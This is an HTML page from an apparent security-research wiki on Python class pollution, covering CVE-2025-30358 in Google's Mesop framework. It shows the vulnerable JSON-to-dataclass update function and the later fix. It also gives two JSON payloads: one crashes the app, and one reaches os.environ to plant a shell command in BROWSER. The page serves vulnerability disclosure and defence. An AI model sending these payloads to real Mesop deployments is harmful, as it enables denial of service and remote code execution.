@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mesop | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/types/" >Vulnerability Types</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/consequences/" >Consequences</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Collection</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcases</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/reference/" >Reference</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/reference/cve-index/" >CVE Index</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/faq/" >FAQ</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/history/" >History</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="mesop-cve-2025-30358">Mesop (CVE-2025-30358)</h1>
+<p><strong>Mesop</strong> is Google&rsquo;s Python-based UI framework for building web applications (5.7K stars), designed for rapid prototyping of ML demos and internal tools.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Repository</td>
+          <td><a href="https://github.com/google/mesop">google/mesop</a></td>
+      </tr>
+      <tr>
+          <td>Version</td>
+          <td>v0.13.0</td>
+      </tr>
+      <tr>
+          <td>CVE</td>
+          <td>CVE-2025-30358</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Constrained-Get × Dual-Set</td>
+      </tr>
+      <tr>
+          <td>Input</td>
+          <td>Remote (HTTP)</td>
+      </tr>
+      <tr>
+          <td>Status</td>
+          <td>Fixed</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The vulnerability exists in <code>_recursive_update_dataclass_from_json_obj</code>, which deserializes JSON state updates from the client:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_recursive_update_dataclass_from_json_obj</span>(instance: Any, json_dict: Any):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> json_dict<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hasattr(instance, key):
+</span></span><span style="display:flex;"><span>            attr <span style="color:#f92672">=</span> getattr(instance, key)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> isinstance(value, dict):
+</span></span><span style="display:flex;"><span>                setattr(
+</span></span><span style="display:flex;"><span>                    instance, key,
+</span></span><span style="display:flex;"><span>                    _recursive_update_dataclass_from_json_obj(attr, value),
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                setattr(instance, key, value)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> isinstance(instance, dict):
+</span></span><span style="display:flex;"><span>                instance[key] <span style="color:#f92672">=</span> value
+</span></span></code></pre></div><p>The function:</p>
+<ol>
+<li>Iterates over attacker-controlled JSON keys</li>
+<li>Checks <code>hasattr(instance, key)</code> — this succeeds for dunder attributes like <code>__class__</code></li>
+<li>Resolves via <code>getattr(instance, key)</code> (Constrained-Get)</li>
+<li>Sets via <code>setattr</code> or <code>instance[key] = value</code> (Dual-Set)</li>
+</ol>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="dos">DoS</h3>
+<p>The simplest attack — overwrite <code>__getattribute__</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;__class__&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;__getattribute__&#34;</span>: <span style="color:#e6db74">&#34;crash&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Effect</strong>: All state class instances become inaccessible. The application crashes on any subsequent request that accesses state.</p>
+<h3 id="remote-execution">Remote Execution</h3>
+<p>Via the standard module traversal pattern:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;__class__&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;__init__&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;__globals__&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;sys&#34;</span>: {
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&#34;modules&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;os&#34;</span>: {
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&#34;environ&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;BROWSER&#34;</span>: <span style="color:#e6db74">&#34;/bin/sh -c &#39;id &gt; /tmp/pwned&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>              }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="why-mesop-is-interesting">Why Mesop Is Interesting</h2>
+<ol>
+<li><strong>Dataclass-based state</strong>: Mesop uses Python dataclasses for state management, which naturally have dunder attributes accessible via <code>hasattr</code></li>
+<li><strong>Client-controlled JSON</strong>: State updates come directly from the browser</li>
+<li><strong>Google&rsquo;s framework</strong>: Demonstrates that even major tech companies can introduce class pollution vulnerabilities</li>
+<li><strong>Pattern similarity</strong>: The recursive JSON-to-object update pattern is extremely common in Python web frameworks</li>
+</ol>
+<h2 id="defense-applied-after-fix">Defense Applied (After Fix)</h2>
+<p>Google&rsquo;s fix for Mesop checks for leading/trailing underscores in key names:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_recursive_update_dataclass_from_json_obj</span>(instance: Any, json_dict: Any):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> json_dict<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> key<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;_&#34;</span>) <span style="color:#f92672">or</span> key<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;_&#34;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>  <span style="color:#75715e"># Skip dunder and private attributes</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ... rest of function</span>
+</span></span></code></pre></div><p>This is one of the three defense patterns identified in the paper (see <a href="/wiki/docs/defense/">Defense</a>).</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>See <a href="https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/mesop/poc"><code>cp-collection/mesop/poc/</code></a> for the full exploit.</p>
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
